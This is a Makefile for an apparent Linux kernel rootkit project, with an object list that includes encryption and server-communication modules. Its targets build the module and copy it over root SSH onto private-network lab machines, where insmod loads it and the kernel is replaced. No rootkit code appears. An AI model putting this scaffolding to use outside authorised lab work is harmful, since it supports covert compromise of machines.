obj-m += rootkit.o
rootkit-objs := main.o net/socket.o net/encryption.o rootkit/tools.o server/protocol.o server/communication.o
TARGET = rootkit
PWD := $(CURDIR)
LINUX_DIR := $(shell pwd)/../linux-6.8.5/
# LINUX_DIR := /usr/src/linux/
# LINUX_DIR := $(shell pwd)/../linux-6.7.1
# LINUX_DIR := /lib/modules/$(shell uname -r)/build/

all:
	make -C $(LINUX_DIR) M=$(PWD) modules
	# make -C /home/kw0gen/Code/rootkit/linux-6.8.5/ M=$(PWD) modules
clean:
	make -C $(LINUX_DIR) M=$(PWD) clean
default:
	make -C $(shell pwd)/../linux-6.8.5_default/ M=$(PWD) make

install:
	scp -i ../.ssh/id_ed25519 ./rootkit.ko root@192.168.100.186:~/rootkit.ko
	ssh -i ../.ssh/id_ed25519 root@192.168.100.186 rmmod rootkit \; insmod \~/rootkit.ko \; dmesg
install-kali:
	ssh -i ../.ssh/id_ed25519 root@192.168.122.190 rm -rf ~/rootkit/
	scp -i ../.ssh/id_ed25519 -r ../rootkit root@192.168.122.190:~/rootkit
	ssh -i ../.ssh/id_ed25519 root@192.168.122.190 bash -c 'cd ~/rootkit/ \; make \; rmmod rootkit \; insmod \~/rootkit.ko \; dmesg'
kernel:
	cd ../linux-6.8.5 ; make -j16
kernel_install:
	scp -i ../.ssh/id_ed25519 ../linux-6.8.5/arch/x86/boot/bzImage root@192.168.100.186:/boot/vmlinuz-linux
	ssh -i ../.ssh/id_ed25519 root@192.168.100.186 reboot
default_kernel_install:
	cd ../linux-6.8.5_default ; make -j16
default_kernel_install:
	scp -i ../.ssh/id_ed25519 ./linux-6.8.5_default/arch/x86/boot/bzImage root@192.168.100.186:/boot/vmlinuz-linux
	ssh -i ../.ssh/id_ed25519 root@192.168.100.186 reboot

	# zcat /proc/config.gz >> .config
